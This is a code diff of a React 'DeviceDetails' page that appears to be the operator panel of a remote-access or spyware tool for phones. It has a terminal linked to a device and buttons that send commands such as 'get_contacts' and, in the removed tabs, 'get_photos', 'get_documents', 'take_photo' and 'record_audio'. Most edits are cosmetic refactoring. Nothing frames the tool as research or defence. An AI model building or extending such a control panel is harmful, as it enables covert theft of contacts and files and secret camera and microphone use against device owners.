-            {/* Terminal Output */}
             <div
               ref={terminalRef}
               className="h-64 bg-black rounded-xl p-4 font-mono text-sm overflow-y-auto mb-4 space-y-1"
@@ -717,9 +1136,7 @@ export default function DeviceDetails() {
               <div className="text-green-400">
                 [System] Connected to {deviceId}
               </div>
-              <div className="text-dark-400">
-                [System] Type 'help' for available commands
-              </div>
+              <div className="text-dark-400">[System] Type commands below</div>
               {terminalOutput.map((line, i) => (
                 <div
                   key={i}
@@ -735,7 +1152,6 @@ export default function DeviceDetails() {
               ))}
             </div>
 
-            {/* Terminal Input */}
             <form onSubmit={handleTerminalCommand} className="flex gap-3">
               <input
                 type="text"
@@ -748,12 +1164,10 @@ export default function DeviceDetails() {
                 type="submit"
                 className="px-6 py-3 rounded-xl bg-primary-500 text-white hover:bg-primary-600 transition-all flex items-center gap-2"
               >
-                <FiSend />
-                Send
+                <FiSend /> Send
               </button>
             </form>
 
-            {/* Command Reference */}
             <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-2">
               {[
                 "get_contacts",
@@ -775,76 +1189,12 @@ export default function DeviceDetails() {
               ].map((cmd) => (
                 <button
                   key={cmd}
-                  onClick={() => {
-                    setTerminalInput(cmd);
-                  }}
+                  onClick={() => setTerminalInput(cmd)}
                   className="text-xs p-2 rounded-lg bg-dark-700/30 hover:bg-dark-700/50 text-dark-400 hover:text-white transition-all text-left font-mono"
                 >
                   {cmd}
                 </button>
               ))}
-            </div>
-          </div>
-        )}
-
-        {/* Files Tab */}
-        {activeTab === "files" && (
-          <div className="glass-effect rounded-2xl p-6">
-            <div className="flex items-center justify-between mb-4">
-              <h3 className="text-lg font-semibold">File System</h3>
-              <div className="flex gap-2">
-                <button
-                  onClick={() => sendCommand("get_photos")}
-                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
-                >
-                  Photos
-                </button>
-                <button
-                  onClick={() => sendCommand("get_videos")}
-                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
-                >
-                  Videos
-                </button>
-                <button
-                  onClick={() => sendCommand("get_documents")}
-                  className="px-4 py-2 rounded-xl bg-dark-700/50 text-sm hover:bg-dark-700 transition-all"
-                >
-                  Documents
-                </button>
-              </div>
-            </div>
-            <div className="text-center py-12 text-dark-400">
-              <FiFolder className="text-4xl mx-auto mb-3 opacity-50" />
-              <p>Click a category button above to fetch files</p>
-            </div>
-          </div>
-        )}
-
-        {/* Camera Tab */}
-        {activeTab === "camera" && (
-          <div className="glass-effect rounded-2xl p-6">
-            <h3 className="text-lg font-semibold mb-4">Camera Controls</h3>
-            <div className="grid grid-cols-2 gap-4">
-              <button
-                onClick={() => sendCommand("take_photo")}
-                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
-              >
-                <FiCamera className="text-4xl mx-auto mb-3 text-primary-400" />
-                <p className="font-medium">Take Photo</p>
-                <p className="text-xs text-dark-400 mt-1">
-                  Capture from front/back camera
-                </p>
-              </button>
-              <button
-                onClick={() => sendCommand("record_audio", { action: "start" })}
-                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
-              >
-                <FiMic className="text-4xl mx-auto mb-3 text-primary-400" />
-                <p className="font-medium">Record Audio</p>
-                <p className="text-xs text-dark-400 mt-1">
-                  Start microphone recording
-                </p>
-              </button>
             </div>
           </div>
         )}
